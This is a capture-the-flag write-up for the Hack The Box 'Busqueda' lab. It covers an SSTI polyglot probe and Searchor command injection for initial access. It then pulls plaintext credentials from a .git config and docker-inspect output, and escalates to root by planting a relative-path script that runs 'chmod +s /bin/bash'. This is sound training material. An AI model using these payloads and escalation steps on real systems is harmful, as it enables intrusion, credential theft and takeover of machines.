Hello there, this is write up for Busqueda box from Hackthebox.

Starting off with nmap scan on all ports:

```
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-16 13:14 CEST
Nmap scan report for searcher.htb (10.10.11.208)
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Searcher
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/2.1.2 Python/3.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We will add the hostname to our `/etc/hosts` and visit the web page:

```
# echo "10.10.11.208 searcher.htb" >> /etc/hosts
```

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Busqueda/images/IMG1.png?raw=true)

It is a python app meaning we will try ssti with this polyglot payload ${{<%[%'"}}%\.
When put in field on the main page it returns empty page meaning some character there is bad character.
Searching for Searchor 2.4.0 returns github with cve https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/blob/main/exploit.sh#L14. We can just take the payload that is used in this script and we have code execution:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Busqueda/images/IMG2.png?raw=true)

Now we can get reverse shell (it need to be url encoded):

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Busqueda/images/IMG3.png?raw=true)

We are user svc now. Looking for ways to escalate to root I found port 3000:

```
ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess                                                     
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*                                                               
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*                                                               
tcp   LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*                                                               
tcp   LISTEN 0      4096       127.0.0.1:36943      0.0.0.0:*                                                               
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*                                                               
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*                                                               
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*                                                               
tcp   LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*                                                               
tcp   LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*    users:(("python3",pid=1596,fd=6),("python3",pid=1596,fd=4))
tcp   LISTEN 0      511                *:80               *:*                                                               
tcp   LISTEN 0      128             [::]:22            [::]:*    
```

With curl I found out that it is gitea:

```
vc@busqueda:/var/www/app$ curl 127.0.0.1:3000
curl 127.0.0.1:3000
<!DOCTYPE html>
<html lang="en-US" class="theme-auto">
<head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gitea: Git with a cup of tea</title>
        <link rel="manifest" href="data:application/json;base64,eyJuYW1lIjoiR2l0ZWE6IEdpdCB3aXRoIGEgY3VwIG9mIHRlYSIsInNob3J0X25hbWUiOiJHaXRlYTogR2l0IHdpdGggYSBjdXAgb2YgdGVhIiwic3RhcnRfdXJsIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi8iLCJpY29ucyI6W3sic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28ucG5nIiwidHlwZSI6ImltYWdlL3BuZyIsInNpemVzIjoiNTEyeDUxMiJ9LHsic3JjIjoiaHR0cDovL2dpdGVhLnNlYXJjaGVyLmh0Yi9hc3NldHMvaW1nL2xvZ28uc3ZnIiwidHlwZSI6ImltYWdlL3N2Zyt4bWwiLCJzaXplcyI6IjUxMng1MTIifV19">
        <meta name="theme-color" content="#6cc644">
        <meta name="default-theme" content="auto">
        <meta name="author" content="Gitea - Git with a cup of tea">
```


There is a virtual host:

```
svc@busqueda:/etc/apache2/sites-enabled$ cat 000-default.conf
cat 000-default.conf
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:5000/
        ProxyPassReverse / http://127.0.0.1:5000/

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^searcher.htb$
        RewriteRule /.* http://searcher.htb/ [R]

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName gitea.searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:3000/
        ProxyPassReverse / http://127.0.0.1:3000/

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>
```

After adding it to `/etc/hosts` we can now visit the site:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Busqueda/images/IMG4.png?raw=true) 


But unfortunately we don't have credentials. There is a .git directory:

```
svc@busqueda:/var/www/app$ ls -la
ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
drwxr-xr-x 8 www-data www-data 4096 Aug 16 05:25 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates

```

And there is a config file with credentials:

```
svc@busqueda:/var/www/app/.git$ cat config 
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main

```

The password also works for svc user:

```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

Let's try to run it:

```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
[sudo] password for svc: 
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

From docker-inspect on mysql we get mysql password:

```
svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect "{{json .Config}}" f84a6b33fb5a | jq
{
  "Hostname": "f84a6b33fb5a",
  "Domainname": "",
  "User": "",
  "AttachStdin": false,
  "AttachStdout": false,
  "AttachStderr": false,
  "ExposedPorts": {
    "3306/tcp": {},
    "33060/tcp": {}
  },
  "Tty": false,
  "OpenStdin": false,
  "StdinOnce": false,
  "Env": [
    "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
    "MYSQL_USER=gitea",
    "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
    "MYSQL_DATABASE=gitea",
    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
    "GOSU_VERSION=1.14",
    "MYSQL_MAJOR=8.0",
    "MYSQL_VERSION=8.0.31-1.el8",
    "MYSQL_SHELL_VERSION=8.0.31-1.el8"
  ],
  "Cmd": [
    "mysqld"
  ],
  "Image": "mysql:8",
  "Volumes": {
    "/var/lib/mysql": {}
  },
  "WorkingDir": "",
  "Entrypoint": [
    "docker-entrypoint.sh"
  ],
  "OnBuild": null,
  "Labels": {
    "com.docker.compose.config-hash": "1b3f25a702c351e42b82c1867f5761829ada67262ed4ab55276e50538c54792b",
    "com.docker.compose.container-number": "1",
    "com.docker.compose.oneoff": "False",
    "com.docker.compose.project": "docker",
    "com.docker.compose.project.config_files": "docker-compose.yml",
    "com.docker.compose.project.working_dir": "/root/scripts/docker",
    "com.docker.compose.service": "db",
    "com.docker.compose.version": "1.29.2"
  }
}

```

Trying the password from mysql database we can login as administrator to gitea:

![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Busqueda/images/IMG5.png?raw=true)


We see the script that we can run as sudo:

```
#!/bin/bash
import subprocess
import sys

actions = ['full-checkup', 'docker-ps','docker-inspect']

def run_command(arg_list):
    r = subprocess.run(arg_list, capture_output=True)
    if r.stderr:
        output = r.stderr.decode()
    else:
        output = r.stdout.decode()

    return output


def process_action(action):
    if action == 'docker-inspect':
        try:
            _format = sys.argv[2]
            if len(_format) == 0:
                print(f"Format can't be empty")
                exit(1)
            container = sys.argv[3]
            arg_list = ['docker', 'inspect', '--format', _format, container]
            print(run_command(arg_list)) 
        
        except IndexError:
            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
            exit(1)
    
        except Exception as e:
            print('Something went wrong')
            exit(1)
    
    elif action == 'docker-ps':
        try:
            arg_list = ['docker', 'ps']
            print(run_command(arg_list)) 
        
        except:
            print('Something went wrong')
            exit(1)

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            

if __name__ == '__main__':

    try:
        action = sys.argv[1]
        if action in actions:
            process_action(action)
        else:
            raise IndexError

    except IndexError:
        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
        print('')
        print('     docker-ps     : List running docker containers')
        print('     docker-inspect : Inpect a certain docker container')
        print('     full-checkup  : Run a full system checkup')
        print('')
        exit(1)
```

The full check up doesn't use full path so we can abuse it and create our own full-checkup.sh that will make bash setuid:

```
svc@busqueda:/tmp$  sudo python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!
svc@busqueda:/tmp$ echo "chmod +s /bin/bash" > full-checkup.sh
svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
svc@busqueda:/tmp$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1396520 Jan  6  2022 /bin/bash
bash-5.1# id
uid=1000(svc) gid=1000(svc) euid=0(root) egid=0(root) groups=0(root)
```

Thank you for reading this write up. If you have any questions, feedback or suggestion or just want to play ctfs with someone you can reach out to me at
https://twitter.com/Vojtech1337